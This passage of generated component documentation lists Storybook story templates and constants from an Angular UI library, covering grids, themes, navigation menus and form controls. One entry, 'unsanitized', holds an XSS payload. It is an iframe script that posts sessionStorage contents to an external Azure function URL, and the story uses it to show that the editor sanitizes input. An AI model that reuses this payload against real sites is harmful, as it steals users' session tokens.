        "file": "libs/core/src/lib/styles.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<Record<string, >>",
        "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `<app-dialog-demo [separatorLines]=\"separatorLines\"></app-dialog-demo>`,\n} )"
      },
      {
        "name": "StoGrid",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "(args: Record<string, unknown>) => ( {\n  props: { ...args },\n  template: `<mat-card class=\"sto-card\">\n<div style=\"background: white;\" stoGrid [maxWidth]=\"1000\" [breakpoints]=\"breakpoints\">\n<div stoGridColumn style=\"background: lightblue;\">1 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">2 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">3 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">4 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">5 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">6 (col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">7 (double col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">8 (double col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" stoGridSpacer>9 (double spacer, hidden on 2-col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">10 (double col)</div>\n<div stoGridColumn style=\"background: lightblue;\">11 (col)</div>\n<div stoGridColumn stoGridSpacer>12 (spacer, hidden on 1-col)</div>\n<div stoGridColumn style=\"background: transparent;\" class=\"sto-form\"></div>\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\">13 (col spacer, hidden on 1-col grid)</div>\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\" [stoGridColumnDouble]=\"true\" >14 (double spacer, hidden on 2-col)</div>\n</div>\n</mat-card>`\n} )"
      },
      {
        "name": "StoTheme",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/core/src/lib/styles.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<Record<string, >>",
        "defaultValue": "args => ( {\n  props: { ...args, colors: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] },\n  styles: [\n    `\n    .container { display: flex; }\n    .container > div {\n     flex: 0 1 auto;\n     padding-left: 16px;\n     }\n    `\n  ],\n  template: `\n  <mat-tab-group>\n  <mat-tab label=\"Buttons\">\n    <mat-card class=\"sto-card\">\n    <div *ngFor=\"let color of colors\">\n      <mat-card-subtitle class=\"sto-card__subtitle\">\n    <h2>{{ color }}</h2>\n</mat-card-subtitle>\n    <button mat-button [color]=\"color\">Mat Button</button>\n    <button mat-stroked-button [color]=\"color\">Mat stroked Button</button>\n    <button mat-flat-button [color]=\"color\">Mat flat Button</button>\n    <button mat-raised-button [color]=\"color\">Mat raised Button</button>\n    <button mat-icon-button [color]=\"color\"><mat-icon>home</mat-icon></button>\n</div>\n</mat-card>\n  </mat-tab>\n  <mat-tab label=\"Cards\">\n  <mat-card *ngFor=\"let c of colors\" [ngClass]=\"'mat-' + c\">\n  <mat-card-title>{{ c }}</mat-card-title>\n</mat-card>\n</mat-tab>\n<mat-tab label=\"Text\">\n<mat-card class=\"sto-card\">\n    <div class=\"container\">\n    <div>\n    <p *ngFor=\"let color of colors\" [ngClass]=\"'mat-' + color\">&lt;p&gt; {{ color }}</p>\n</div>\n<div>\n    <span *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;span&gt; {{ color }}\n</span>\n</div>\n<div>\n    <h2 *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;h[1|2|3|4|5]&gt; {{ color }}\n</h2>\n</div>\n</div>\n</mat-card>\n</mat-tab>\n</mat-tab-group>\n  `,\n} )"
      },
      {
        "name": "subNavigation",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "object",
        "defaultValue": "{\n  'name': 'Application 2',\n  'groups': [\n    {\n      'name': null,\n      'items': [\n        {\n          'icon': 'date_range',\n          'name': 'Section 1',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '1'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'format_list_bulleted',\n          'name': 'Section 2',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '2'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'train',\n          'name': 'Section 3',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '3'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'access_time',\n          'name': 'Section 4',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '4'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'description',\n          'name': 'Section 5',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '5'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        }\n      ],\n      'hasDivider': false,\n      'svgIcon': false,\n      'icon': null\n    },\n    {\n      'name': null,\n      'items': [\n        {\n          'icon': 'train',\n          'name': 'SubSection 1',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '11'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'person',\n          'name': 'SubSection 2',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '12'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'business',\n          'name': 'SubSection 3',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              'SubSection 13'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'settings',\n          'name': 'SubSection 4',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '4'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        }\n      ],\n      'hasDivider': true,\n      'svgIcon': false,\n      'icon': null\n    }\n  ]\n}"
      },
      {
        "name": "Success",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoMessagePanelComponent>",
        "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"success\" [dismissable]=\"false\" icon=\"info\">Warning Text Content</sto-message-panel>'\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/error-handler/src/lib/error-handler.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<Record<string, >>",
        "defaultValue": "(args: Record<string, unknown> ) => {\n  return {\n    props: args,\n    template: `<next-wrapper></next-wrapper>`,\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<Record<string, >>",
        "defaultValue": "(args: Record<string, unknown>) => {\n  return {\n    props: args,\n    template: `<mat-card>\n<mat-card-title><h2>This replaces StoComplexDatatable and is only here for CSS</h2></mat-card-title>\n<ngx-datatable [loadingIndicator]=\"loading\"\n[footerHeight]=\"40\"\n[selectionType]=\"'single'\"\n[scrollbarV]=\"true\"\n[scrollbarH]=\"horizontalScroll\"\n[style.height.px]=\"height\"\n[rowHeight]=\"rowHeight\"\n[headerHeight]=\"headerHeight\"\n[class.sto-datatable]=\"withCss\"\n[rows]=\"rows\"\n[columns]=\"columns\"></ngx-datatable>\n</mat-card>`\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<>",
        "defaultValue": "(args: StoBreadcrumbsComponent) => {\n  return {\n    props: args,\n    // template: `<sto-app-header [breadCrumbs]=\"breadCrumbs\" [environmentName]=\"environmentName\" [testEnvironment]=\"testEnvironment\"></sto-app-header>`\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<>",
        "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: args,\n    template: `<sto-app-header [breadCrumbs]=\"breadCrumbs\" [environmentName]=\"environmentName\" [testEnvironment]=\"testEnvironment\"></sto-app-header>`\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoActionFooterComponent>",
        "defaultValue": "(args: StoActionFooterComponent) => {\n  return {\n    component: StoActionFooterComponent,\n    props: {\n      ...args,\n      save: action('Save'),\n      cancel: action('Cancel')\n    },\n    template: '<sto-action-footer [isLoading]=\"isLoading\" [position]=\"position\" [shouldAddClass]=\"shouldAddClass\"><button mat-flat-button (click)=\"save()\" color=\"primary\">Save</button><button (click)=\"cancel()\" mat-button>Cancel</button></sto-action-footer>'\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<>",
        "defaultValue": "(args: StoFilterPanelComponent) => {\n  return {\n    component: StoFilterPanelComponent,\n    props: args,\n    template: `\n      <sto-filter-panel class=\"sto-form\"\n                        [expandable]=\"expandable\"\n                        [expanded]=\"expanded\"\n                        (toggled)=\"toggled()\">\n          <sto-filter-title>{{ title }}</sto-filter-title>\n          <sto-filter-table-actions>\n              <button mat-icon-button>\n                  <mat-icon>add</mat-icon>\n              </button>\n          </sto-filter-table-actions>\n          <div class=\"sto-form\"\n               stoGrid>\n              <mat-form-field floatLabel=\"always\"\n              stoFormField\n                              stoGridColumn>\n                  <mat-label>Field 1</mat-label>\n                  <input matInput>\n              </mat-form-field>\n              <mat-form-field floatLabel=\"always\"\n              stoFormField\n                              stoGridColumn>\n                  <mat-label>Field 2 (multi)</mat-label>\n                  <mat-select [multiple]=\"true\">\n                      <mat-option [value]=\"1\">{{1}}</mat-option>\n                      <mat-option [value]=\"2\">{{2}}</mat-option>\n                      <mat-option [value]=\"3\">{{3}}</mat-option>\n                      <mat-option [value]=\"4\">{{4}}</mat-option>\n                  </mat-select>\n              </mat-form-field>\n              <div stoGridColumn\n                   [stoGridColumnDouble]=\"true\"\n                   stoGridSpacer></div>\n          </div>\n      </sto-filter-panel>`\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<>",
        "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    component: StoMessagePanelComponent,\n    props: { ...args, dismissed: action('Dismissed') },\n    template: '<sto-message-panel [color]=\"color\" [dismissable]=\"dismissable\" [icon]=\"icon\" (dismissed)=\"dismissed()\">{{ contents }}</sto-message-panel>'\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<>",
        "defaultValue": "(args) => {\n  return {\n    component: FormFieldDirective,\n    props: {\n      ...args,\n      formGroup: new UntypedFormGroup({\n        first: new UntypedFormControl('Some value')\n      }),\n      dropdown: 'B'\n    },\n    template: `\n  <mat-card class=\"sto-form\">\n<mat-form-field [formGroup]=\"formGroup\" stoFormField *ngIf=\"withClasses\">\n<mat-label>Form field with styles</mat-label>\n<input  formControlName=\"first\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\n</mat-form-field>\n<mat-form-field stoFormField *ngIf=\"withClasses\">\n<mat-label>Form field with styles</mat-label>\n<mat-select name=\"dropdown\" [ngModel]=\"dropdown\" (selectionChange)=\"dropdown = $event\">\n<mat-option value=\"A\">A</mat-option>\n<mat-option value=\"B\">B</mat-option>\n</mat-select>\n</mat-form-field>\n<mat-form-field appearance=\"fill\" *ngIf=\"!withClasses\">\n<mat-label>Form field without styles</mat-label>\n<input value=\"Some value\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\n</mat-form-field>\n<mat-form-field stoFormField *ngIf=\"withClasses\">\n<mat-label>Text area with styles</mat-label>\n<textarea name=\"test\" matInput [cdkTextareaAutosize]=\"true\">\nSome Text Content\n\nShould not select all on click\n</textarea>\n</mat-form-field>\n</mat-card>`\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/number-input/number-input.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<>",
        "defaultValue": "(args) => {\n  return {\n    component: NumberInputComponent,\n    props: {\n      ...args,\n      change: action('Value changed'),\n      control: new UntypedFormControl(null, Validators.required),\n      toggleValidator: (ctrl: AbstractControl) => {\n        if ( ctrl.validator ) {\n          ctrl.clearValidators();\n        } else {\n          ctrl.setValidators(Validators.required);\n        }\n        ctrl.updateValueAndValidity();\n      },\n    },\n    template: `\n  <mat-card class=\"sto-form\" style=\"width: 600px\">\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\n  <button (click)=\"toggleValidator(control)\">Toggle validator</button><br>\n  <button (click)=\"control.markAsTouched()\">Touched</button><br>\n    <mat-form-field stoFormField floatLabel=\"always\">\n      <mat-label>{{label}}</mat-label>\n      <sto-number-input (ngModelChange)=\"change($event)\"\n            [dynamicFractionSize]=\"dynamicFractionSize\"\n                        [fractionSize]=\"fractionSize\"\n                        [readonly]=\"readonly\"\n                        [formControl]=\"control\"\n                        [placeholder]=\"placeholder\">\n      </sto-number-input>\n      <span matSuffix>{{ suffix }}</span>\n      <mat-error *ngIf=\"control.hasError('required')\">{{ control.getError('required') }}</mat-error>\n    </mat-form-field><br>\n    {{control.value}}\n  </mat-card>`\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<>",
        "defaultValue": "(args) => {\n  return {\n    component: NumberUnitInputComponent,\n    props: {\n      ...args,\n      control,\n      change: action('Value changed'),\n    },\n    template: `\n<mat-card class=\"sto-form\" style=\"width: 600px\">\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\n    <mat-form-field stoFormField floatLabel=\"always\">\n      <mat-label>{{label}}</mat-label>\n      <sto-number-unit-input (ngModelChange)=\"change($event)\"\n      [fractionSize]=\"fractionSize\"\n      [list]=\"units\"\n      [readonly]=\"readonly\"\n      [formControl]=\"control\"\n      [unitPlaceholder]=\"unitPlaceholder\"\n      [unitClearText]=\"unitClearText\"\n      [unitOptional]=\"unitOptional\"\n      [placeholder]=\"placeholder\">\n      </sto-number-unit-input>\n    </mat-form-field><br>\n    {{control.value | json}}\n  </mat-card>`\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<SlideToggleComponent>",
        "defaultValue": "(args) => {\n  return {\n    component: SlideToggleComponent,\n    props: {\n      ...args,\n      ctrl: new UntypedFormControl(true),\n      valueChange: action('Value changed'),\n      toggled: (event: unknown) => {\n        console.log(event);\n        action('Toggled event');\n      }\n    },\n    template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\">\n  <button (click)=\"ctrl.disabled ? ctrl.enable() : ctrl.disable()\">Toggle disabled</button><br>\n<mat-form-field stoFormField floatLabel=\"always\">\n    <mat-label>Slide toggle</mat-label>\n    <sto-slide-toggle (toggled)=\"toggled($event)\" [color]=\"color\" [readonly]=\"readonly\" [formControl]=\"ctrl\" (ngModelChange)=\"valueChange($event)\"></sto-slide-toggle>\n</mat-form-field>\n</mat-card>`\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<WysiwygComponent>",
        "defaultValue": "(args) => {\n  const ctrl = new UntypedFormControl(unsanitized);\n  return {\n    props: { ...args, ctrl, unsanitized },\n    template: `\n<sto-wysiwyg [readonly]=\"readonly\" #wysiwyg [formControl]=\"ctrl\"></sto-wysiwyg>\n<hr>\n<div>\n<p>The text we're sending in is</p>\n<div style=\"background-color: lightgray\"><code>{{ unsanitized }}</code></div>\n<br>\n<p>The resulting HTML output is then sanitized </p>\n<div style=\"background-color: lightgray\"><code >{{ wysiwyg.value.changingThisBreaksApplicationSecurity }}</code></div>\n<p>While it gets sanitized in the wysiwyg editor, best practice dictates that sanitizing happens before sending it in\n(and preferable on your backend service)</p>\n</div>\n`\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<NavDrawerComponent>",
        "defaultValue": "(args: NavDrawerComponent) => {\n  return {\n    component: NavDrawerComponent,\n    props: {\n      ...args,\n      activate: action('Activate route')\n    },\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoDrawerComponent>",
        "defaultValue": "(args: StoDrawerComponent) => {\n  return {\n    component: StoDrawerComponent,\n    props: args,\n    template: `\n  <div>\n  <sto-drawer [position]=\"'right'\" [open]=\"true\" [animation]=\"animation\" [backdrop]=\"backdrop\">\n<sto-drawer-header>\n<div class=\"sto-drawer__header__title\">\n<h2>Title</h2>\n      </div>\n</sto-drawer-header>\n\n<mat-card class=\"sto-card\"><p>Content in drawer</p></mat-card>\n\n<sto-drawer-footer>\n<button mat-button color=\"primary\">Save</button>\n</sto-drawer-footer>\n</sto-drawer>\n\n\n<mat-card class=\"sto-card sto-form\">\n<button mat-raised-button>Open</button>\n</mat-card>\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n</div>\n`,\n\n  };\n}"
      },
      {
        "name": "Template",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<>",
        "defaultValue": "(args: StoDrawerComponent) => {\n  const actions = {\n    handleCommand: action('Link pressed'),\n    topsNav: action('Open tops landing'),\n    toggle: action('Switch side'),\n    closeMenu: action('Close menu'),\n  };\n  return {\n    component: StoDrawerComponent,\n    props: { ...args, ...actions, navigation, subNavigation },\n    template: `<div>\n  <sto-drawer [open]=\"open\" [animation]=\"animation\" [backdrop]=\"backdrop\">\n<sto-drawer-header>\n<div class=\"sto-drawer__header__infix\">\n        <button *ngIf=\"activePane === 'right'; else topIcon\"\n                type=\"button\"\n                mat-icon-button\n                (click)=\"toggle(); activePane = 'left'\">\n          <mat-icon>arrow_back</mat-icon>\n        </button>\n        <ng-template #topIcon>\n          <button mat-icon-button\n          type=\"button\"\n          (click)=\"topsNav()\">\n            <mat-icon [class.sto-main-icon--test-environment]=\"testEnvironment\">settings</mat-icon>\n          </button>\n        </ng-template>\n      </div>\n<div class=\"sto-drawer__header__title\">\n        <ng-container *ngIf=\"activePane === 'right'; else leftName;\">\n          <span *ngIf=\"activePane === 'right'\">\n           {{rightMenu.name}}\n         </span>\n        </ng-container>\n        <ng-template #leftName>\n         <span *ngIf=\"activePane === 'left'\">\n           {{leftMenu.name}}\n         </span>\n        </ng-template>\n      </div>\n      <div class=\"sto-drawer__header__suffix\">\n        <button type=\"button\"\n                mat-icon-button\n                (click)=\"closeMenu(); open = false\">\n          <mat-icon>close</mat-icon>\n        </button>\n      </div>\n</sto-drawer-header>\n<sto-slide-panel class=\"sto-slide-panel\"\n                     [activePane]=\"activePane\">\n                     {{activePane}}\n<sto-navigation-menu [menu]=\"subNavigation\"\n*ngIf=\"activePane === 'right'\"\n                         (onCommand)=\"handleCommand('internal', $event.command)\"\n                         rightPane></sto-navigation-menu>\n<sto-navigation-menu [menu]=\"navigation\"\n*ngIf=\"activePane === 'left'\"\n                         (onCommand)=\"activePane = 'right'; handleCommand('root', $event.command)\"\n                         leftPane></sto-navigation-menu>\n                         </sto-slide-panel>\n</sto-drawer>\n\n\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n</div>`\n  };\n}"
      },
      {
        "name": "THEME_SAVER",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/theme/theme-saver.service.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new InjectionToken<ThemeSaver>('sto__theme__typo')"
      },
      {
        "name": "themes",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/theme/models.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new Map<ThemeName, ThemeClassName>([\n  [ 'light', 'sto-light-theme' ],\n  [ 'dark', 'sto-dark-theme' ],\n])"
      },
      {
        "name": "typography",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/theme/models.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new Map<TypographyName, TypographyClassName>([\n  [ 'small', 'sto-sm-typography' ],\n  [ 'medium', 'sto-m-typography' ],\n  [ 'large', 'sto-l-typography' ],\n])"
      },
      {
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "jest.config.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "require('@nrwl/jest')"
      },
      {
        "name": "unsanitized",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "`<iframe srcdoc=\"<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>\">\n</iframe>\n<b>This is bold.</b>\n`"
      },
      {
        "name": "Usage",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<PreferenceManagerComponent>",
        "defaultValue": "(args: PreferenceManagerComponent) => {\n  return {\n    props: {\n      ...args,\n      filterForm: new UntypedFormControl(),\n      onSelect: function (id: string) {\n        this.activePreferenceId = id;\n        this.filterForm.reset();\n        action('Select preference')(id);\n      },\n      onSetDefault: function (pref: Preference) {\n        const preferences = this.preferences as Preference[];\n        const index = preferences.findIndex(p => p.id === pref.id);\n        const prefs: Preference[] = [ ...preferences ].map(p => ( { ...p, default: false } ));\n        prefs[ index ] = pref;\n        this.loadingIndicator = true;\n        action('Set default preference')(pref.name);\n        setTimeout(() => {\n          this.preferences = prefs;\n          this.loadingIndicator = false;\n        }, 300);\n      },\n      onEdit: function (pref: Preference) {\n        const preferences = this.preferences as Preference[];\n        const index = preferences.findIndex(p => p.id === pref.id);\n        const prefs = [ ...preferences ];\n        prefs[ index ] = pref;\n        // Set preference in payload\n        this.loadingIndicator = true;\n        this.filterForm.markAsPristine();\n        action('Edit preference')(`${pref.name} with id ${pref.id}`);\n\n        setTimeout(() => {\n          this.preferences = prefs;\n          this.loadingIndicator = false;\n        }, 300);\n      },\n      onDeletePreference: function (id: string) {\n        action('Delete preference')(id);\n        const preferences = this.prerences as Preference[];\n        const index = preferences.findIndex(p => p.id === id);\n        const prefs = [ ...preferences ];\n        prefs.splice(index, 1);\n        this.preferences = prefs;\n      },\n      onAdd: function (preference: Preference) {\n        action('Create preference')(preference);\n        preference.id = Date.now().toString(10);\n        this.preferences = [ ...this.preferences, preference ];\n      }\n    },\n    component: PreferenceManagerComponent,\n    template: `\n<sto-filter-panel [expandable]=\"true\" [expanded]=\"true\">\n  <sto-filter-title><sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\n                                            (editPreference)=\"onEdit($event)\"\n                                            (addNewPreference)=\"onAdd($event)\"\n                                            [dirty]=\"filterForm.dirty\"\n                                            (deletePreference)=\"onDeletePreference($event)\"\n                                            (selectPreference)=\"onSelect($event)\"\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\n                                            [activePreferenceId]=\"activePreferenceId\"\n                                            [preferences]=\"preferences\"></sto-preference-manager></sto-filter-title>\n  <input [formControl]=\"filterForm\" placeholder=\"Write stuff here to trigger modified\">\n  <button (click)=\"filterForm.reset(); filterForm.markAsPristine()\">And click to clear</button>\n</sto-filter-panel>\n\n<sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\n                                            (editPreference)=\"onEdit($event)\"\n                                            (addNewPreference)=\"onAdd($event)\"\n                                            [dirty]=\"filterForm.dirty\"\n                                            (deletePreference)=\"onDeletePreference($event)\"\n                                            (selectPreference)=\"onSelect($event)\"\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\n                                            [activePreferenceId]=\"activePreferenceId\"\n                                            [preferences]=\"preferences\"></sto-preference-manager>\n`\n  };\n}"
      },
      {
        "name": "Usage",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<ConfirmDemoComponent>",
        "defaultValue": "(args: ConfirmDemoComponent) => {\n  return {\n    component: ConfirmDemoComponent,\n    props: args,\n    template: '<app-confirm-demo></app-confirm-demo>'\n  };\n}"
      },
      {
        "name": "Usage",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "Usage",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/number-input/number-input.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "Usage",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "Usage",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "Usage",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "UsageWithInput",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "USE_HASH_ROUTING",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/sto-navigation/tokens.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new InjectionToken<boolean>('sto.nav.hash')"
      },
      {
        "name": "validCommands",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[\n  'bold',\n  'underline',\n  'italic',\n  'createLink',\n  'insertUnorderedList',\n  'insertOrderedList',\n  'removeFormat',\n]"
      },
      {
        "name": "Warn",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoMessagePanelComponent>",
        "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warn\" [dismissable]=\"false\" icon=\"warning\">Warn Text Content</sto-message-panel>'\n  };\n}"
      },
      {
        "name": "Warning",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoMessagePanelComponent>",
